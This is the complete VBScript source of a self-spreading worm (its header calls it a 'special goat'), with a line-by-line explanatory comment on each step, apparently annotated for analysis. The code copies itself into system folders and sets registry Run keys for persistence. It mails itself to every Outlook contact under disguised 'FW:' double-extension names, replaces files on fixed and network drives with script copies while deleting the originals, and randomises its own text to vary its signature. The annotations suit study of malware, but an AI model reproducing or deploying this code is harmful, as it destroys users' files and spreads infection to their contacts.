rem special goat, do not spread! m.s.
' Initial comment, likely a note from the author ("m.s.") suggesting it’s a "special goat" (Trojan), though ironically, it does spread.

dim fso, WindowsScriptShell
dim WindowsDir, WindowsSystemDir, WindowsRecentDir
dim MySelf, MyNewName, CopyToSend, MyCode, MyFile
' Declaration of global variables:
' - fso: FileSystemObject for file and folder manipulation.
' - WindowsScriptShell: Object for interacting with the Windows shell (registry, etc.).
' - Paths to system directories (Windows, System32, Recent).
' - Variables to manage the script itself and its copies.

Main ' Calls the main function to start the script.

sub Main()
    On Error Resume Next ' Ignores errors to continue execution even if issues occur.
    Initialize ' Initializes variables and prepares the script.
    InfectComputer ' Infects the local system.
    SpreadToEmails ' Sends the worm via email through Outlook.
    SpreadToLocal ' Spreads the worm across local drives.
end sub

sub Initialize
    On Error Resume Next
    dim folder, files
    set WindowsScriptShell = CreateObject("WScript.Shell") ' Creates a shell object for registry and system interaction.
    Set fso = CreateObject("Scripting.FileSystemObject") ' Creates a FileSystemObject for file/directory operations.
    Set MySelf = fso.GetFile(WScript.ScriptFullName) ' Gets the current script file (itself).
    Set MyFile = fso.OpenTextFile(WScript.ScriptFullName, 1) ' Opens the script for reading to copy its code.
    WindowsDir = fso.GetSpecialFolder(0) ' Retrieves the Windows directory path (e.g., C:\Windows).
    WindowsSystemDir = fso.GetSpecialFolder(1) ' Retrieves the System32 directory path.
    WindowsRecentDir = WindowsDir & "\Recent" ' Path to the "Recent" folder in Windows.
    MyNewName = CreateName ' Generates a random name for script copies.
    set folder = fso.GetFolder(WindowsRecentDir) ' Accesses the "Recent" folder.
    set files = folder.files ' Lists files in "Recent".
    If cint(files.count) > 0 then ' If there are files in "Recent":
        randomize (timer) ' Initializes the random number generator with the current time.
        tmpFileNmber = int(rnd(1) * files.count) ' Picks a random file from the list.
        Indx = 0
        for each file in files ' Loops through the files.
            Indx = Indx + 1
            if tmpFileNmber = Indx then ' If the file matches the random index:
                CopyToSend = fso.GetBaseName(file.path) ' Uses its base name (without extension).
            end if
        next
    else
        CopyToSend = MyNewName ' Otherwise, uses the randomly generated name.
    end if
    CopyToSend = CopyToSend & CreateExtension ' Adds a random extension (e.g., .Doc.Vbs).
end sub

sub InfectComputer
    On Error Resume Next
    dim Extension
    Extension = CreateExtension ' Generates a random extension (e.g., .Txt.Vbs).
    MySelf.Copy(WindowsSystemDir & "\" & MyNewName & Extension) ' Copies the script to System32.
    MySelf.Copy(WindowsDir & "\" & MyNewName & Extension) ' Copies the script to Windows.
    set NewCopy = fso.OpenTextFile(WindowsSystemDir & "\" & CopyToSend, 2, true) ' Creates a new file in System32.
    NewCopy.write Transform ' Writes a transformed version of the code to this file.
    NewCopy.close ' Closes the file.
    CreateReg "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" & MyNewName, WindowsSystemDir & "\" & MyNewName & Extension ' Adds a startup key to the registry.
    CreateReg "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\" & MyNewName, WindowsDir & "\" & MyNewName & Extension ' Adds another key for persistence.
end sub

sub SpreadToEmails
    On Error Resume Next
    dim AddressIndex, AddressBook, ListIndex, MailAddress, Outlook, MAPI
    set Outlook = WScript.CreateObject("Outlook.Application") ' Creates an Outlook instance.
    set MAPI = Outlook.GetNameSpace("MAPI") ' Accesses the MAPI namespace for address books.
    for ListIndex = 1 to MAPI.AddressLists.Count ' Loops through each address book.
        set AddressBook = MAPI.AddressLists(ListIndex)
        for AddressIndex = 1 to AddressBook.AddressEntries.Count ' Loops through each contact.
            MailAddress = AddressBook.AddressEntries(AddressIndex) ' Gets the email address.
            set mail = Outlook.CreateItem(0) ' Creates a new email.
            mail.Recipients.Add(MailAddress) ' Adds the recipient.
            mail.Subject = "FW: " & left(CopyToSend, len(CopyToSend) - 4) ' Subject mimics a forwarded file (e.g., "FW: Document").
            mail.Body = "" ' Empty body.
            mail.Attachments.Add(WindowsSystemDir & "\" & CopyToSend) ' Attaches a copy of the worm.
            mail.Send ' Sends the email.
        next
    next
    Set Outlook = Nothing ' Releases the Outlook object.
    Set MAPI = Nothing ' Releases the MAPI object.
end sub

sub SpreadToLocal
    On Error Resume Next
    SearchDrives ' Searches drives to infect local files.
end sub

sub SearchDrives
    On Error Resume Next
    Dim Drive, LstDrives
    Set LstDrives = fso.Drives ' Lists all available drives.
    For Each Drive in LstDrives
        If Drive.DriveType = 2 or Drive.DriveType = 3 Then ' 2 = fixed drive, 3 = network drive.
            SearchFolders(Drive.path & "\") ' Explores folders on the drive.
        End If
    Next
end sub

sub SearchFolders(folderspec)
    On Error Resume Next
    dim f, f1, sf
    set f = fso.GetFolder(folderspec) ' Accesses the specified folder.
    set sf = f.SubFolders ' Lists subfolders.
    for each f1 in sf
        infectfiles(f1.path) ' Infects files in the folder.
        SearchFolders(f1.path) ' Recursively explores subfolders.
    next
end sub

sub Infectfiles(folderspec)
    On Error Resume Next
    dim folder, file, files, extension
    dim FileName, NewCopy, BaseName
    set folder = fso.GetFolder(folderspec) ' Accesses the folder.
    set files = folder.Files ' Lists files.
    for each file in files
        FileName = file.name ' Gets the file name.
        set NewCopy = fso.OpenTextFile(file.path & ".Vbs", 2, true) ' Creates a new .vbs file.
        NewCopy.write NewCode ' Writes the worm’s code (undefined in this version?).
        NewCopy.close ' Closes the file.
        fso.DeleteFile(file.path) ' Deletes the original file.
    next
end sub

function Transform
    On Error Resume Next
    dim NewCode, LineText
    NewCode = ""
    do while (MyFile.atendofstream <> TRUE) ' Reads the script line by line.
        LineText = cstr(MyFile.ReadLine) ' Reads a line.
        randomize(timer) ' Generates a random number.
        tmpIndx = int(rnd(1) * 10) + 1 ' Random number between 1 and 10.
        if ucase(left(trim(LineText), 1)) = "'" then ' If the line is a comment:
            ' Skips comments.
        else
            for Indx2 = 1 to tmpIndx ' Adds random "noise" lines.
                NewCode = NewCode & string(tmpIndx, " ") & "'" ' Adds spaces and a comment.
                for Indx = 1 to tmpIndx
                    NewCode = NewCode & CreateName ' Adds random names in the comment.
                next
                NewCode = NewCode & vbCrLf ' New line.
            next
        end if
        NewCode = NewCode & Space(tmpIndx * 5) & LineText & vbCrLf ' Adds the original line with indentation.
    loop
    Transform = NewCode ' Returns the modified code.
end Function

function CreateName
    On Error Resume Next
    dim tmpName, Indx, NameLen
    randomize(timer)
    NameLen = int(rnd(1) * 30) + 1 ' Random name length (1 to 30).
    for Indx = 1 to NameLen
        randomize (timer)
        tmpName = tmpName & chr(int(rnd(1) * 26) + 65) ' Generates an uppercase letter (A-Z).
    next
    CreateName = tmpName ' Returns the random name.
end function

function CreateExtension
    On Error Resume Next
    TypeExtension = "DocXlsMdbBmpMp3TxtJpgGifMovUrlHtmTxt" ' List of deceptive extensions.
    randomize (timer)
    tmpFileType = int(rnd(1) * 11) + 1 ' Picks a random index.
    CreateExtension = "." & mid(TypeExtension, ((tmpFileType - 1) * 3) + 1, 3) ' Extracts an extension (e.g., .Doc).
    CreateExtension = CreateExtension & ".Vbs" ' Appends .Vbs (e.g., .Doc.Vbs).
end function

sub CreateReg (regkey, regvalue)
    On Error Resume Next
    Set regedit = CreateObject("WScript.Shell") ' Creates a shell object for registry edits.
    regedit.RegWrite regkey, regvalue ' Writes a key/value to the registry.
end sub
